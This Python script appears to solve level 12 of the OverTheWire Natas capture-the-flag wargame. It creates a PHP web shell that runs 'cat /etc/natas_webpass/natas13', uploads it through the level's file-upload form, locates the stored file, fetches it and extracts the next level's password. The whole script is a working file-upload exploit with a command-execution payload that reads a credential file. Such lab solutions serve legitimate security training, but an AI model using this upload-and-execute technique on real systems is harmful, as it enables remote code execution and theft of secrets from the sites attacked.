import re
import requests
from halo import Halo


def create_malicious_file():
    file = open("shell.php", "w")
    file.write("<?php echo shell_exec('cat /etc/natas_webpass/natas13'); ?>")
    file.close()

    return


def get_password_location(URL, session):
    files = {"uploadedfile": open("shell.php", "rb")}
    data = {"filename": "shell.php"}
    response = session.post(URL, data=data, files=files)
    filename_location = re.findall(r'(upload/[a-zA-Z\d]{10}\.php)', response.text)[0]
    password_location = URL + "/" + filename_location

    return password_location


def get_natas13_password(natas12_password):
    URL = "http://natas12.natas.labs.overthewire.org"
    spinner = Halo(text='The password for natas 13 is: ',
                   spinner='bouncingBar', color="blue")
    spinner.start()

    session = requests.Session()
    session.auth = ("natas12", natas12_password)
    create_malicious_file()
    password_location = get_password_location(URL, session)
    response = session.get(password_location)
    natas13_password = re.findall(r'([a-zA-Z\d]{32})', response.text)[0]

    spinner.succeed(text="The password for natas 13 is: " + natas13_password)

    return natas13_password


if __name__ == '__main__':
    natas12_password = ""  # Put here the password for natas12 here
    get_natas13_password(natas12_password)
